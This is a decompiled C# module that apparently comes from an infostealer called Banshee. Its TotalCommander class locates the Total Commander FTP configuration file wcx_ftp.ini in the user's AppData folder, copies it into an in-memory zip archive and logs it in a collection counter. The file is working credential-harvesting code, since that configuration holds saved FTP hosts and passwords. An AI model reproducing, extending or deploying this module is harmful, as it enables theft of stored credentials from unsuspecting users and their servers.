﻿using System;
using System.IO;
using Banshee.Helper.Data;

namespace Banshee.Targets.Applications
{
	// Token: 0x020000A6 RID: 166
	public class TotalCommander : ITarget
	{
		// Token: 0x060001EB RID: 491 RVA: 0x00010804 File Offset: 0x00010804
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "GHISLER", "wcx_ftp.ini");
			if (File.Exists(text))
			{
				string text2 = "Total Commander\\wcx_ftp.ini";
				zip.AddFile(text2, File.ReadAllBytes(text));
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Total Commander";
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Applications.Add(counterApplications);
			}
		}
	}
}
